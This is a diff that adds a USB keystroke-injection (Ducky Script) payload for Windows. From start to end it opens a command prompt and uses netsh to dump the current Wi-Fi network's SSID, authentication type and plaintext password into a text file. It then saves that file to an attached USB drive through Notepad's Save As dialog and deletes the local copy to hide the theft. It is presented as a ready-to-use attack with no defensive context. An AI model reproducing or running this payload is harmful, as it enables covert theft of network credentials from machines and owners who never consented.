@@ -1,0 +1,87 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+REM The @ will be typed as " in the Command prompt
+STRING cd @%USERPROFILE%\Desktop@ & for /f @tokens=2 delims=: @ %A in ('netsh wlan show interface ^| findstr @SSID@ ^| findstr /v @BSSID@') do set A=%A
+ENTER
+DELAY 100
+STRING netsh wlan show profiles %A% key=clear | findstr /c:@Network type@ /c:@Authentication@ /c:@Key Content@ | findstr /v @broadcast@ | findstr /v @Radio@>>A.txt
+ENTER
+DELAY 100
+STRING for /f @tokens=3 delims=: @ %A in ('findstr @Network type@ A.txt') do set B=%A
+ENTER
+DELAY 100
+STRING for /f @tokens=2 delims=: @ %A in ('findstr @Authentication@ A.txt') do set C=%A
+ENTER
+DELAY 100
+STRING for /f @tokens=3 delims=: @ %A in ('findstr @Key Content@ A.txt') do set D=%A
+ENTER
+DELAY 100
+STRING del A.txt
+ENTER
+DELAY 100
+STRING echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt
+ENTER
+DELAY 100
+CONTROL ESCAPE
+DELAY 100
+STRING Log.txt
+DELAY 100
+ENTER
+DELAY 300
+REM Goes to "Save as"
+ALT f
+DELAY 500
+STRING a
+DELAY 100
+REM The TABS goes to the Location Chain Ex. "> This PC > Local Disk (C:)"
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 500
+REM This will go to "This PC"
+STRING Z
+DELAY 200
+REM This drops down to what's connected to PC "Ex. USB")
+ENTER
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 200
+STRING Log
+DELAY 300
+ENTER
+DELAY 200
+REM Exits notepad
+ALT f
+DELAY 100
+STRING x
+DELAY 200
+REM It will go back to Command prompt and next command deletes the text doc.
+STRING del log.txt
+DELAY 100
+ENTER
+DELAY 100
+STRING exit
+DELAY 100
+ENTER
